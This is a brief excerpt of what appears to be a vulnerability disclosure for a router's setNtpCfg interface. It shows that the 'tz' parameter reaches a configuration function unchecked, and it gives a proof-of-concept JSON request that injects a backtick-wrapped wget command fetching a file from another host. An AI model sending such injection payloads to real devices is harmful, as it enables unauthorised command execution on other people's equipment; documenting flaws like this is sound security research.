...
In sub_428EC8 function, it reads in a user-provided parameter `tz` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `tz` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setNtpCfg","tz":"`wget 192.168.6.1:7777/testpoc`"
}
```
